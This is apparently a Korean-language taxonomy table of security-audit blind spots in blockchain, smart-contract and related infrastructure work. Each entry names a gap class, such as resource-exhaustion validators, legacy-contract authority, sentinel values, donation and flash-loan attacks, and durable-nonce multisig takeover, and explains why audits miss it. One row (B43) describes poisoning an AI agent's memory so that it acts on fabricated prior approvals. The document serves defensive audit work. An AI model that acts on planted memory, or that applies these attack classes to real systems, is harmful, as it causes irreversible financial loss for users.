| META-67 Validation Cost-Ceiling Gap (VCCG) вАФ нНЉнФМнМА 2026-05-07 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА validator, encoder, parser, attestation check, dependency verifier к∞ЩмЭА assurance layerмЧР лМАнХі `м†ХлЛµмЭД лІЮк≤М нМРл≥ДнХШлКФк∞А` лКФ лђїмІАлІМ, **к≥µк≤©мЮРк∞А мЮЕл†• нШХнГЬл•Љ лєДнЛАмЦі CPU¬Јл©Фл™®л¶ђ¬ЈмЛЬк∞Д лєДмЪ©мЭД лєДм†ХмГБм†БмЬЉл°Ь нВ§мЪЄ мИШ мЮИлКФк∞А** лКФ л≥ДлПД л≥імХИ к≤љк≥Дл°Ь мЮШ лЛ§л£®мІА мХКлКФлЛ§. кЈЄ к≤∞к≥Љ к≤Ам¶ЭмЄµмЭА fail-open/fail-stopмЭД лЕЉнХШкЄ∞лПД м†ДмЧР **cheap-to-trigger, expensive-to-process resource-exhaustion actuator** к∞А лРЬлЛ§. RustSec `RUSTSEC-2026-0118`/`0120` мЭА NSEC3 closest-encloser validationмЭі root-stall/OOMмЬЉл°Ь мЭімЦімІИ мИШ мЮИмЭМмЭД, `RUSTSEC-2026-0119` лКФ name-compression encoderк∞А O(n¬≤) CPU sinkк∞А лР† мИШ мЮИмЭМмЭД л≥імЧђм§АлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† validator/encoderл•Љ л≥інШЄлІЙмЬЉл°ЬлІМ л≥ік≥† adversarial work-factor surfaceл°ЬлКФ мЮШ л≥імІА мХКлКФлЛ§. вС° correctness¬Јsoundness л™ЕмДЄлКФ мН®лПД `input bound / allocation ceiling / timeout budget` мЭА л≥імХИ мЪФкµђл°Ь мЮШ мКєк≤©нХШмІА мХКлКФлЛ§. вСҐ threat modelмЭі actor¬Јasset¬ЈassumptionкєМмІАлІМ м†Бк≥† к≤Ам¶Э лЛ®к≥Дл≥Д лєДмЪ© мГБнХЬмЭА лє†лЬ®л¶∞лЛ§. вС£ л∞Шл≥µм†БмЭЄ slow-path мХХл∞ХмЭі к≤∞кµ≠ operator bypassл•Љ лґАл•ілКФ мЪімШБ мЬ†мЭЄмЭД к≥ЉмЖМнПЙк∞АнХЬлЛ§. **META-65/66к≥ЉмЭШ кµђл≥Д**: META-65лКФ cheap search vs scarce closure, META-66мЭА к≤Ам¶Эл©і мЛ§нМ® мЛЬ мЭШлѓЄл°†мЭД лЛ§л£ђлЛ§. META-67мЭА **кЈЄ мЭім†Д лЛ®к≥Д, м¶Й к≤Ам¶Эл©і мЮРм≤імЭШ к≥ДмВ∞лєДмЪ© мГБнХЬмЭД мД§к≥ДнЦИлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-68 Decommission-Semantics / Legacy-Liveness Gap (DSLLG) вАФ нНЉнФМнМА 2026-05-15 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА мГИ UI, мГИ SDK, мГИ л∞∞нПђл≥Є, V2 м†ДнЩШ, deprecated лЭЉл≤®, sunset к≥µмІАл°Ь мЦілЦ§ surfaceк∞А `мЭАнЗінЦИлЛ§` к≥† лКРлВАлЛ§. кЈЄлЯђлВШ мЛ§м†Ь л≥імХИмЭА лЭЉл≤®мЭі мХДлЛИлЭЉ **old pathк∞А мЧђм†ДнЮИ live authority, standing approval, residual fee balance, reinitializer, version counter, shared vault/state write кґМнХЬмЭД к∞ЦлКФк∞А** мЧР лЛђл†§ мЮИлЛ§. мµЬкЈЉ Renegade V1, Huma V1, Transit legacy TRON, Aurellion Diamond Proxy мВђл°АлКФ л™®лСР `нШДмЮђ л≤Дм†ДмЭА мХИм†ДнХШлЛ§` мЩА `мШЫ нСЬл©імЭі лНФ мЭімГБ мЮРкЄИмЭД мЫАмІБмЭЉ мИШ мЧЖлЛ§` к∞А лЛ§л•ілЛ§лКФ м†РмЭД л≥імЧђм§АлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† к∞РмВђ л≤ФмЬДк∞А current package / current entrypoint / current deployment м§СмЛђмЬЉл°Ь мҐБмХДмІАк≥† deprecated surfaceлКФ мЪімШБмГБ лѓЄмВђмЪ© к∞Ам†ХмЬЉл°Ь л∞Ал¶∞лЛ§. вС° migration checkк∞А мГИ к≤љл°Ь нЩЬмД±нЩФ мЧђлґАмЧР мІСм§СнХШк≥†, old allowance¬Јfee pot¬Јversion slot¬Јshared authority м†Ьк±∞лКФ л≥ДлПД мҐЕл£М м°∞к±імЬЉл°Ь к≥†м†ХлРШмІА мХКлКФлЛ§. вСҐ нМАмЭА UI/SDK routing м†Ьк±∞л•Љ decommission м¶Эк±∞л°Ь мШ§мЭЄнХШк≥† on-chain reachabilityмЩА residual approvalмЭД мґ©лґДнЮИ лЛ§мЛЬ мДЄмІА мХКлКФлЛ§. вС£ мВђк≥† нЫД `legacy contract only`, `user funds not affected`, `current contracts are secure` к∞ЩмЭА нСЬнШДмЭі мЛ§м†Ь privileged residueл•Љ лК¶к≤М мЮђлґДл•ШнХШк≤М лІМлУ†лЛ§. **META-58/64/A119мЩАмЭШ кµђл≥Д**: META-58мЭА default ownership seam, META-64лКФ incident мЛЬ revoke set completeness, A119лКФ immutable legacy packageк∞А shared stateл•Љ мУ∞лКФ кЄ∞мИ† л≤°нД∞лЛ§. META-68мЭА **retirement мД†мЦЄ мЮРм≤ік∞А л≥імХИ мҐЕл£М м°∞к±імЭі мХДлЛИлЭЉ, live authority м†Ьк±∞мЩА reachability м¶ЭлєЩкєМмІА нПђнХ®нХЬ decommission semanticsмЧђмХЉ нХЬлЛ§** лКФ кµђм°∞л•Љ кЈЬм†ХнХЬлЛ§. |
| META-69 Provisional-State / Irreversible-Entitlement Gap (PSIEG) вАФ нНЉнФМнМА 2026-05-17 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА `tx seen`, `confirmed`, facilitator ack, off-chain verify-pass к∞ЩмЭА **мІДнЦЙ м§С мГБнГЬ** л•Љ UXмГБ мґ©лґДнХЬ мЛ†нШЄл°Ь л∞ЫмХДлУ§мЭік≥†, кЈЄ мЬДмЧРмДЬ API мЭСлЛµ¬ЈмЬ†л£М лН∞мЭінД∞¬ЈлПДкµђ мЛ§нЦЙ¬Јл¶ђмЖМмК§ м†СкЈЉ к∞ЩмЭА **лРШлПМл¶і мИШ мЧЖлКФ entitlement** л•Љ л®Љм†А мЧімЦім§АлЛ§. кЈЄлЯђлВШ provisional stateлКФ settlement-grade authorityк∞А мХДлЛИлЛ§. x402 мЧ∞кµђк∞А л≥імЧђм£ЉлУѓ мЭі к≤љк≥Дл•Љ нЭРл¶ђл©і grant-before-finality, settlement preemption, replay/idempotency collapse, cache/header leakк∞А нХЬ лђґмЭМмЬЉл°Ь нД∞мІАл©∞ **payment-service correspondence** мЮРм≤ік∞А лђілДИмІДлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† мК§лІИнКЄмї®нКЄлЮЩнКЄ к∞РмВђлКФ payment validityл•Љ л≥ік≥†, backend/API л¶ђлЈ∞лКФ cache/idempotencyл•Љ л≥іл©∞, лСШ мВђмЭімЭШ **grant threshold** лКФ лђім£Љк≥µмВ∞мЭі лРШкЄ∞ мЙљлЛ§. вС° `confirmed`/receipt/ackл•Љ UX acceptable stateл°Ь лЛ§л£®лЛ§ л≥ілЛИ кЈЄк≤ГмЭі к≥І irreversible entitlement thresholdлЭЉлКФ мШ§нХік∞А мГЭкЄілЛ§. вСҐ нФДл°ЬнЖ†мљЬ лђЄмДЬк∞А quoteвЖТpayвЖТgrant happy pathлКФ кЄЄк≤М мД§л™ЕнХілПД finality, one-shot binding, cache hygiene, rollback impossibilityлКФ мІІк±∞лВШ мГЭлЮµлРЬлЛ§. вС£ valueк∞А м≤імЭЄ л∞ЦмЬЉл°Ь лВШк∞АлКФ мИЬк∞ДмЭА лРШлПМл¶ђкЄ∞ мЦіл†§мЪілН∞лПД нМАмЭА лВШм§С refund/disputeл°Ь л©ФмЪЄ мИШ мЮИлЛ§к≥† м∞©к∞БнХЬлЛ§. **META-10/66/B79мЩАмЭШ кµђл≥Д**: META-10мЭА нЖµнХ© к≤љк≥Д ownership diffusion, META-66мЭА assurance plane failure semantics, B79лКФ кµђм≤і exploit primitiveлЛ§. META-69лКФ **мЩЬ м°∞мІБмЭі intermediate stateл•Љ settlement-grade кґМнХЬмЬЉл°Ь мШ§мЭЄнХі кЈЄлЯ∞ primitiveл•Љ к≥ДмЖН shipping нХШлКФк∞А** л•Љ лЛ§л£ђлЛ§. |
| META-70 Node-Audit / Edge-Semantics Gap (NAESG) вАФ нНЉнФМнМА 2026-05-26 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА contract, keeper, AI agent, bridge verifier, wallet, dashboard к∞ЩмЭА **лЕЄлУЬ(node)** л•Љ к∞Бк∞Б к∞РмВђнХШк≥† hardeningнХШмІАлІМ, мЛ§м†Ь к≥µк≤©мЭА м†Рм†Р кЈЄ мВђмЭі **edge semantics** вАФ лИДк∞А signer sourceл•Љ к≥†л•Љ мИШ мЮИлКФк∞А, retry/ACK мИЬмДЬк∞А лђімЧЗмЭД мЭШлѓЄнХШлКФк∞А, мЦілЦ§ off-chain evidenceк∞А on-chain mutationмЭД мЧі мИШ мЮИлКФк∞А, мЦілЦ§ agent outputмЭі wallet authorityл°Ь мКєк≤©лРШлКФк∞А вАФ мЧРмДЬ лВЬлЛ§. мµЬкЈЉ Bankr, Butter Bridge, RetoSwap, Mure, WUSD/GLOVEмЩА Cloudflare Glasswing/Foundry gap signalмЭА л™®лСР `к∞Ьл≥Д мїінПђлДМнКЄлКФ лі§мІАлІМ к≤љк≥Д к∞Д мЭШлѓЄл°†мЭА лНЬ к≥†м†ХлРРлЛ§` лКФ к∞ЩмЭА кµђм°∞л•Љ л≥імЧђм§АлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† audit/FV/fuzz/AI reviewк∞А м†АмЮ•мЖМ¬Јл™®лУИ¬ЈнХ®мИШ лЛ®мЬД coverageмЧР мµЬм†БнЩФлПЉ path/edgeл≥Д мЭШлѓЄл°†мЭД л≥ДлПД мЮРмВ∞мЬЉл°Ь мЮШ лЛ§л£®мІА мХКлКФлЛ§. вС° л©ФмЛЬмІА¬ЈACK¬Јfallback data¬Јverifier sourceл•Љ plumbing/schema лђЄм†Ьл°Ь лВЃмґ∞ л≥ік≥†, мЛ§м†Ь authority transitionмЬЉл°Ь мЮђлґДл•ШнХШмІА мХКлКФлЛ§. вСҐ multi-step pathлКФ к∞Б лЛ®к≥Дк∞А individually correctмЧђлПД м°∞нХ© semanticsк∞А нЛАл¶і мИШ мЮИлКФлН∞, tool budgetк≥Љ human review ownershipмЭі кЈЄ м†Дм≤і к≤љл°Ьл•Љ лБЭкєМмІА к∞ЦмІА мХКлКФлЛ§. вС£ мЪімШБмГБ false-positive лґАлЛі лХМлђЄмЧР runtime cross-checkк∞А bootstrapмЭілВШ happy pathмЧРлІМ лВ®к≥†, мЬДкЄ∞ лХМ м§СмЪФнХЬ edge invariantлКФ мЩДнЩФлРШкЄ∞ мЙљлЛ§. **META-61/63/69/A125/A127к≥ЉмЭШ кµђл≥Д**: META-61мЭА мљФмЦі assuranceк∞А м£Љл≥А planeмЬЉл°Ь л≤ИмІАлКФ нЫДкіС, META-63мЭА л∞Ьк≤ђлРЬ мЖНмД±мЭі мЪімШБ мЛ†нШЄк∞А лРШлКФк∞А, META-69лКФ intermediate state entitlement лђЄм†Ь, A125/A127мЭА к∞БкЄ∞ bridge/export¬Јauthorization-rootмЭШ кµђм≤і primitiveлЛ§. META-70мЭА кЈЄл≥ілЛ§ мГБмЬДмЧРмДЬ **мЩЬ мЛЬмК§нЕЬмЭі node-levelл°ЬлКФ мЮШ л≥імЧђлПД edge-level semanticsлКФ лБЭкєМмІА мЖМмЬ†¬Јк≤Ам¶ЭлРШмІА мХКлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
| META-71 Terminal-State / Sentinel Admissibility Gap (TSSAG) вАФ нНЉнФМнМА 2026-06-01 | **нХµмЛђ лєДлМАмє≠**: нМАмЭА `address(0)`, `Pubkey::default()`, `None`, empty root, renounced owner, unset peer к∞ЩмЭА **sentinel/terminal state** л•Љ вАЬкґМнХЬ мЧЖмЭМвАЭ лШРлКФ вАЬмИШл™Е мҐЕл£МвАЭ л°Ь мЭЄмЛЭнХЬлЛ§. кЈЄлЯђлВШ мЛ§м†Ь auth logicк≥Љ framework wrapperлКФ кЈЄ к∞ТмЭД мҐЕмҐЕ **лєДкµР к∞АлК•нХЬ м†ХмГБк∞Т** мЬЉл°Ь лВ®к≤® лСФлЛ§. кЈЄ к≤∞к≥Љ invalid recovery, untyped fallback, special-case validation collapseк∞А к∞ЩмЭА sentinelл°Ь мИШл†інХШл©і **мЛ§нМ®нХімХЉ нХ† к≤Ам¶ЭмЭі мД±к≥µм≤ШлЯЉ л≥імЭік≥†, м£љмЭА кґМнХЬ мГБнГЬк∞А лЛ§мЛЬ privileged truth targetмЬЉл°Ь мЮђнЩЬмД±нЩФ** лРЬлЛ§. **мЩЬ к∞РмВђк∞А лЖУмєШлКФк∞А**: вС† terminal/unset stateл•Љ lifecycle cleanupмЭілВШ UX semanticsл°Ь л≥ік≥†, л≥ДлПДмЭШ authorization boundaryл°Ь мЮђлґДл•ШнХШмІА мХКлКФлЛ§. вС° equality checkлВШ typed wrapperл•Љ л≥ілКФ л¶ђлЈ∞мЦілКФ лєДкµР лМАмГБмЭі мЭілѓЄ live authorityлЭЉк≥† мХФлђµ к∞Ам†ХнХі `sentinel first-reject` к≤Ам¶ЭмЭД мГЭлЮµнХЬлЛ§. вСҐ happy-path нЕМмК§нКЄлКФ valid signer/owner/system-programлІМ лД£к≥†, invalid recovery¬Јdefault pubkey¬Јrenounced owner к∞ЩмЭА **negative terminal states** л•Љ мЮШ лІМлУ§мІА мХКлКФлЛ§. вС£ sentinel к∞ТмЭА framework internalsлВШ config defaultмЧР мИ®мЦі мЮИмЦі мХ†нФМл¶ђмЉАмЭімЕШ мљФлУЬ л¶ђлЈ∞лІМмЬЉл°ЬлКФ collisionмЭД лЦ†мШђл¶ђкЄ∞ мЦіл†µлЛ§. **A123/A129/META-54/68к≥ЉмЭШ кµђл≥Д**: A123к≥Љ A129лКФ к∞БкЄ∞ typed wrapper / zero-addressмЭШ **кµђм≤і exploit primitive** лЛ§. META-54лКФ declared roleк≥Љ effective authority mismatch, META-68мЭА legacy surfaceмЭШ live authority persistenceл•Љ лЛ§л£ђлЛ§. META-71мЭА кЈЄл≥ілЛ§ мГБмЬДмЧРмДЬ **мЩЬ м°∞мІБмЭі вАШлєДнЩЬмД±/мҐЕл£М мГБнГЬлКФ лђінХінХШлЛ§вАЩк≥† лѓњмЭА м±Д кЈЄ мГБнГЬл•Љ мЧђм†ДнЮИ admissible auth valueл°Ь лВ®к≤® лСРлКФк∞А** л•Љ кЈЬм†ХнХЬлЛ§. |
| D34 WASI Hostcall Exhaustion + Async Drop Panic Chain | мШ®м≤імЭЄ л°ЬмІБ м§СмЛђ к∞РмВђк∞А мШ§нФДм≤імЭЄ Wasm мЮДл≤†лФ©(keeper/simulator/plugin) мЮРмЫР нХЬк≥Д мД§м†Хк≥Љ async future lifecycle мХИм†ДмД±кєМмІА к≤Ам¶ЭнХШмІА л™їнХі, к≤МмК§нКЄ мЬ†лПД л©Фл™®л¶ђ к≥†к∞И/нМ®лЛЙ DoSл•Љ мЪімШБ мЭімКИл°Ь лґДл¶ђнХі лЖУмє® (Wasmtime 2026-0020/21/22). |
| A39 Inherited Fork Vulnerability Blindspot | нПђнБђлРЬ мљФлУЬмЭШ мГБмЬД(upstream) мЈ®мХљм†РмЭД "мЭілѓЄ к≤АнЖ†лРЬ мљФлУЬ"л°Ь к∞Дм£ЉнХі к∞РмВђ л≤ФмЬДмЧРмДЬ м†ЬмЩЄ. EVM precompile¬ЈлЄМл¶њмІА л°ЬмІБ лУ± мГБмЖНлРЬ нФДл†ИмЮДмЫМнБђ к≥ДмЄµмЭШ мЛ†кЈЬ мЈ®мХљм†РмЭі нФДл°ЬнЖ†мљЬмЧР кЈЄлМАл°Ь м†ДмЭілР® (SagaEVM, $7M, Jan 2026 вАФ Ethermint precompile мГБмЖН). |
| B39 AI Code Reviewer False-Negative Trust Cascade | AI PR л¶ђлЈ∞ лПДкµђ(мШИ: Immunefi Code Review Agent)мЭШ 'мКємЭЄ' к≤∞к≥Љл•Љ мЭЄк∞Д к∞РмВђ лПЩмєШл°Ь мЈ®кЄЙнХі, лПДкµђк∞А лЛ§л£®мІА л™їнХШлКФ мЦЄмЦі¬ЈнЩШк≤љ¬Јк≤љм†Ь л°ЬмІБ мЄµмЭД мЛђл¶ђм†БмЬЉл°Ь мХИм†Д м≤Шл¶ђ. AI л¶ђлЈ∞ нЖµк≥Љ мЭіл†•мЭі мМУмЭЉмИШл°Э нМАмЭШ мИШлПЩ к≤АнЖ† мЮДк≥ДмєШк∞А лЖТмХДм†Є blind spotмЭі кµђм°∞нЩФлР®. |
| SC02-2026 Business Logic Audit Underweight | OWASP SC Top 10 2026мЧРмДЬ Business LogicмЭі #2л°Ь мГБмКєнЦИмІАлІМ, к∞РмВђ кіАнЦЙмЭА мЧђм†ДнЮИ мљФлУЬ мИШм§А мЈ®мХљм†Р taxonomyмЧР нОЄм§С. мД§к≥Д¬Јк≤љм†Ь л™®лНЄ мИШм§А к≤Ам¶ЭмЭі к∞РмВђ мЛЬк∞ДмЭШ 20% лѓЄлІМмЬЉл°Ь мЬ†мІАлРШмЦі мД§к≥Д к≤∞нХ®мЭі мВђнЫДмЧР л∞Ьк≤ђлР® (OWASP SCS 2026). |
| A40 ERC4626 Share-Price Donation Attack | нФДл°ЬнЖ†мљЬ мЮРм≤і vault л°ЬмІБмЭА "м†ХмГБ лПЩмЮС"мЬЉл°Ь к∞РмВђ нЖµк≥Љ. мЩЄлґА нФДл°ЬнЖ†мљЬмЭі нХілЛє share priceл•Љ лЛіл≥і нПЙк∞АмЧР мУ∞лКФ composability кµђк∞ДмЭД к∞РмВђ л≤ФмЬД л∞ЦмЬЉл°Ь лґДл¶ђнХШмЧђ, donationвЖТк∞Ак≤© м°∞мЮСвЖТк∞Хм†Ьм≤≠мВ∞ к≤љл°Ьл•Љ лЖУмє® (Inverse Finance/LlamaLend 2026-03-02). |
| A41 Burn-Path Fee-Exempt Flash Loan Amplification | л¶ђмЫМлУЬ¬ЈлІИмЭілЛЭ к≥ДмХљмЭШ fee-exempt к≤љл°Ьк∞А мЭЉл∞Ш мЭім≤імЩА лПЩмЭЉнХЬ fee м†Хм±ЕмЭД м†БмЪ©л∞ЫлКФлЛ§к≥† к∞Ам†Х. burn-before-payout мИЬмДЬ мШ§л•ШмЩА к≤∞нХ©лР† лХМ нФМлЮШмЛЬл°†мЬЉл°Ь лґДл™® мЩЬк≥°мЭі м¶ЭнП≠лР®. лЛ®мЭЉ к≤љл°Ь fuzzл°ЬлКФ fee-exempt к≤∞нХ© мЛЬлВШл¶ђмШ§к∞А мґ©лґДнЮИ мЮђнШДлРШмІА мХКмЭМ (SOF/LAXO 2026-02). |
| A42 Anchor Post-CPI Stale Account Cache | Anchor нФДл†ИмЮДмЫМнБђк∞А л™Ел†є мІДмЮЕ мЛЬ PDA лН∞мЭінД∞л•Љ нХЬ л≤ИлІМ мЧ≠мІБл†ђнЩФнХЬлЛ§лКФ мВђмЛ§мЭД мЭінХінХШмІА л™їнХШк≥†, CPI мЭінЫД лПЩмЭЉ к≥Дм†ХмЭД мЮђмЭљлКФ мљФлУЬл•Љ мХИм†ДнХШлЛ§к≥† к∞Дм£Љ. Token-2022 hookмЭі vaultл•Љ мИШм†ХнХ† мИШ мЮИлКФ к≤љл°Ьл•Љ л≥ДлПД к∞РмВђ л≤ФмЬДл°Ь лґДл¶ђнХ®. `.reload()` лИДлЭљмЭі м†Хм†Б лґДмДЭмЧР мЮШ к±Єл¶ђмІА мХКмЭМ (Asymmetric Research CPI post, 2025-04). |
| B40 ACE Fairness / Keeper Ordering Collapse | мЛ§нЦЙ л†ИмЭімЦі к≥µм†ХмД± мЧЕкЈЄл†ИмЭілУЬк∞А нФДл°ЬнЖ†мљЬ л≥імХИ л™®лНЄ(keeper priority мД†мИЬмЬД л≥імЮ•)мЧР лѓЄмєШлКФ мШБнЦ•мЭД к∞РмВђ мЩЄ мЪімШБ мВђнХ≠мЬЉл°Ь лґДл¶ђ. мЛ†мД†лПД к≤АмВђл•Љ мљФлУЬ мИШм§АмЧРмДЬ нЩХмЭЄнХШмІАлІМ м†Хл†ђ л™®лНЄ л≥Ак≤љмЭД к∞АмЪ©мД± мЬДнШС мЛЬлВШл¶ђмШ§л°Ь мЧ∞к≤∞нХШмІА мХКмЭМ (Blockdaemon ACE л°ЬлУЬлІµ, 2026-02). |
| A43 Commit/Reveal Threshold Circumvention | лЛ®мЭЉ нШЄмґЬ кЄ∞м§А мЮДк≥Дк∞Т к≤АмВђл•Љ мґ©лґДнХЬ л≥інШЄл°Ь к∞Дм£ЉнХШк≥† мЧРнПђнБђ лИДм†Б drift мґФм†БмЭД лѓЄл∞ШмШБ. к∞РмВђлКФ мљФлУЬ к≤љл°ЬмЭШ м†ХнЩХмД±мЭД нЩХмЭЄнХШмІАлІМ, мЧђлЯђ нШЄмґЬл°Ь лґДнХ† мЛЬ лИДм†Б нЪ®к≥Љк∞А лПЩмЭЉ мЮДк≥Дл•Љ мЪ∞нЪМнХ®мЭД к≤љм†Ь мЛЬлЃђл†ИмЭімЕШмЬЉл°Ь к≤Ам¶ЭнХШмІА мХКмЭМ (мІБм†С мљФлУЬ к∞РмВђ, 2026-03). |
| B41 Audit Multi-Engagement Scope Fragmentation | лЛ§мИШ к∞РмВђмВђк∞А к∞БмЮР мІАм†Х л≤ФмЬДл•Љ лПЕл¶љ к≤АнЖ†нХі "л≤ФмЬД к∞Д мЭЄнД∞нОШмЭімК§"к∞А кµђм°∞м†БмЬЉл°Ь к≥†мХДк∞А лР®. Euler FinanceмЧРмДЬ `donateToReserves()`лКФ 10к∞Ь к∞РмВђ м§С 1к∞ЬлІМ мї§л≤Д. "к∞РмВђмВђ лІОмЭДмИШл°Э мХИм†Д"мЭілЭЉлКФ мЧ≠мД§м†Б к∞Ам†ХмЭі нБђл°ЬмК§-л™®лУИ мГБнШЄмЮСмЪ© blind spotмЭД мГЭмД± (SigIntZero 2026 Report). |
| B42 Audit Severity Miscalibration | к∞РмВђмЮРк∞А мЈ®мХљм†РмЭД мШђл∞Фл•ік≤М мЛЭл≥ДнЦИмІАлІМ "мљФлУЬк∞А лђЄл≤Хм†БмЬЉл°Ь м†ХнЩХнХШлѓАл°Ь" мЛђк∞БлПДл•Љ м†Хл≥імД±/лВЃмЭМмЬЉл°Ь лґДл•Ш. мЦілУЬлѓЉ кґМнХЬ лВ®мЪ© лУ± к≤љм†Ьм†Б нП≠л∞Ь л∞Шк≤љмЭі нБ∞ мЪімШБ мЛ†лҐ∞ к∞Ам†ХмЭД мљФлУЬ мИШм§А мЛђк∞БлПД нЬіл¶ђмК§нЛ±мЬЉл°Ь нПЙк∞АнХі critical мЧРмК§мїђл†ИмЭімЕШ мЛ§нМ® (CertiK-audited Merlin/Swaprum/Arbix, SigIntZero 2026). |
| B43 AI Agent Memory Injection Attack | мЧРмЭім†ДнКЄ кґМнХЬмЭД мД§к≥Д мЛЬ к≥ЉлЛ§ лґАмЧђ(B29)лВШ лЛ®кЄ∞ лИДм†Б лУЬл¶ђнФДнКЄ(B38)мЩА лЛђл¶ђ, лЯ∞нГАмЮД л©Фл™®л¶ђ мК§нЖ†мЦі мЮРм≤імЧР мХЕмЭШм†Б лН∞мЭінД∞л•Љ м£ЉмЮЕнХі мЧРмЭім†ДнКЄк∞А м°імЮђнХШмІА мХКлКФ мВђм†Д мКємЭЄмЭД "кЄ∞мЦµ"нХШлПДл°Э мЬ†лПД. лЄФл°Эм≤імЭЄ нКЄлЮЬмЮ≠мЕШ лґИк∞АмЧ≠мД± лХМлђЄмЧР лЛ®мЭЉ мД±к≥µмЬЉл°Ь мШБкµђ мЖРмЛ§ л∞ЬмГЭ. мЧРмЭім†ДнКЄ л©Фл™®л¶ђл•Љ мЛ†лҐ∞ к≤љк≥Дл°Ь л≥імІА мХКк≥† мЪімШБ мї®нЕНмК§нКЄл°ЬлІМ мЈ®кЄЙнХі л≥імХИ к≤АнЖ† л≤ФмЬД л∞ЦмЬЉл°Ь лґДл¶ђ (Princeton/Sentient, 2026). |
| B44 SPL Token Account Persistent Delegate Drain | к≥Дм†Х мЖМмЬ†кґМ(owner)к≥Љ мЬДмЮД кґМнХЬ(delegate)мЭШ лґДл¶ђл•Љ к∞РмВђк∞А "м†ХмГБ Solana нЖ†нБ∞ л™®лНЄ"л°Ь мЈ®кЄЙнХШмЧђ dApp мВђмЪ© нЫД delegate мЮФм°імЭД л≥ДлПД к≥µк≤© л≤°нД∞л°Ь лґДл•ШнХШмІА мХКмЭМ. нФДл°ЬнЖ†мљЬ к∞РмВђлКФ vault ATA л≥імХИмЧР мІСм§СнХШк≥†, мВђмЪ©мЮР мЄ° ATA delegateк∞А нФДл°ЬнЖ†мљЬ mint нЭРл¶ДмЭД нЖµнХі мДЄнГБ к≤љл°Ьл°Ь мХЕмЪ©лР† мИШ мЮИмЭМмЭД мИШмЛ† мЄ°мЧРмДЬ к±∞лґАнХімХЉ нХЬлЛ§лКФ м†РмЭД лЖУмє® (Ledger/Canissolana 2026-03-02). |
| A83 libcrux-ml-dsa Signature Verification Faults (RustSec 2026-0076) | A83мЭА `libcrux` мДЬл™Е к≤љк≥ДмЭШ malformed мЮЕл†•мЧР лМАнХЬ мЛ§нМ® лПЩмЮС/мШ§л•Ш мљФлУЬ лПЩмЮСмЭі нХµмЛђмЭЄлН∞, к∞РмВђк∞А API мД±к≥µк≤љл°Ь нЕМмК§нКЄмЧР мІСм§СнХі нБђл¶љнЖ† лЭЉмЭілЄМлЯђл¶ђ лВілґА к≤љк≥ДмЩА panic/fault мЛЬмЭШ fail-open/Fail-hard лПЩмЮСмЭД лИДлЭљнХ† мИШ мЮИмЭМ. |
| A84 libcrux-sha3 Incremental SHAKE Edge-Case (RustSec 2026-0074) | A84лКФ л∞ФмЭінКЄ л∞ФмЪілНФл¶ђ мГБнГЬ л®ЄмЛ† к≤∞нХ®мЬЉл°Ь, off-chain нФДл°ЬмДЄмК§(keeper/RPC/bridge adaptor)к∞А к∞ЩмЭА нБђл¶љнЖ† мК§нГЭмЭД к≥µмЬ†нХ† к≤љмЪ∞ мЪімШБ к≤љл°ЬмЧРмДЬ лУЬлђЄ мЮЕл†•мЬЉл°Ь лєДм†ХмГБ мГБнГЬл•Љ лІМлУЬлКФ мЈ®мХљм†РмЬЉл°Ь мЭімЦімІР. к≤љм†Ьм†Б/мГБнГЬ кЄ∞к≥Д к≤АнЖ†к∞А мЧЖлКФ к∞РмВђк∞А лЖУмєШкЄ∞ мЙђмЫА. |
| B77 Durable Nonce Approval Laundering / Pre-Signed Multisig Admin Takeover | л©АнЛ∞мЛЬкЈЄ м†Хм°±мИШ мґ©м°±к≥Љ мДЬл™Е мЬ†нЪ®мД±лІМ нЩХмЭЄнХШл©і мХИм†ДнХШлЛ§к≥† л≥ік≥†, мКємЭЄ мЛЬм†Рк≥Љ мЛ§нЦЙ мЛЬм†Р мВђмЭімЭШ мЭШлПД л≥ім°і мЧђлґА, nonce лђінЪ®нЩФ м†Им∞®, мДЬл™ЕмЮРмЧРк≤М л≥імЭілКФ мЭЄк∞Д к∞АлПЕнШХ л≥Ак≤љ мЪФмХљмЭД нЕМмК§нКЄнХШмІА мХКмЭМ. к≤∞к≥Љм†БмЬЉл°Ь "м†ХмГБ мДЬл™Е"мЭі "мІАмЧ∞ мЛ§нЦЙлРЬ кґМнХЬ нГИмЈ®"л°Ь м†ДнЩШлР† мИШ мЮИмЭМ. |
| B79 x402 Grant-Before-Settlement / Payment-Service Correspondence Collapse | HTTP/API мДЬлєДмК§ grantмЩА мШ®м≤імЭЄ к≤∞м†Ь settlementл•Љ лґДл¶ђнХЬ м±Д `tx seen`/`confirmed`/facilitator ackлІМмЬЉл°Ь м†СкЈЉмЭД л®Љм†А мЧімЦім£Љл©і, finality мЭім†Д мД†мІАкЄЙ мДЬлєДмК§, facilitator/resource binding мХљнЩФ, replay/idempotency лґХкіі, CDN/header cache лИДмґЬмЭі нХЬ лђґмЭМмЬЉл°Ь нД∞мІИ мИШ мЮИмЭМ. м¶Й к≤∞м†Ь-мДЬлєДмК§ лМАмЭС кіАк≥Д мЮРм≤ік∞А лђілДИм†Є unpaid service / paid-but-denied / stolen grantк∞А л∞ЬмГЭнХ®. |
| A95 Anchor Reload Owner-Drift Bypass | `.reload()` нШЄмґЬмЭД мХИм†ДнХЬ л≥µкµђ лПЩмЮСмЬЉл°Ь к∞Ам†ХнХі нФДл†ИмЮДмЫМнБђ л≤Дм†Дл≥Д owner мЮђк≤Ам¶Э мЭШлѓЄ м∞®мЭіл•Љ лМАм°∞нХШмІА мХКмЭМ. CPI мЭінЫД fresh bytesл•Љ лЛ§мЛЬ мЭљлКФ мИЬк∞ДмЭШ мЛ†лҐ∞ к≤љк≥Дк∞А мХ± мљФлУЬк∞А мХДлЛИлЭЉ нФДл†ИмЮДмЫМнБђ кµђнШДмЧР мЮИлЛ§лКФ м†РмЭД лЖУмє®. |
